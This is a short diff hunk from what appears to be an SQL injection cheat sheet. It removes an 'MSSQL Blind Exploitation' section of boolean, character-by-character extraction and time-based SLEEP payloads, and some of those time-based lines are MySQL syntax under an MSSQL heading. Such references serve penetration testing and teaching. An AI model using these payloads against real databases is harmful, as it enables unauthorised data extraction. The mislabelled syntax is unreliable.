@@ -519,25 +519,6 @@ SELECT SYSTEM_USER
 SELECT IS_SRVROLEMEMBER('sysadmin')
 ```
 
-### MSSQL Blind Exploitation
-
-```sql
--- Numeric context differences
-AND 1=1
-AND 1=2
-
--- Leak data character by character
-AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)=109
-
--- Time-based
-AND IF(substring(user(),1,1)='a',SLEEP(5),1)--"
-
--- Check if admin table exists
-AND IF(SUBSTRING((select 1 from admin limit 0,1),1,1)=1,SLEEP(5),1)
-```
-
----
-
 ## PostgreSQL Specific
 
 ### Version
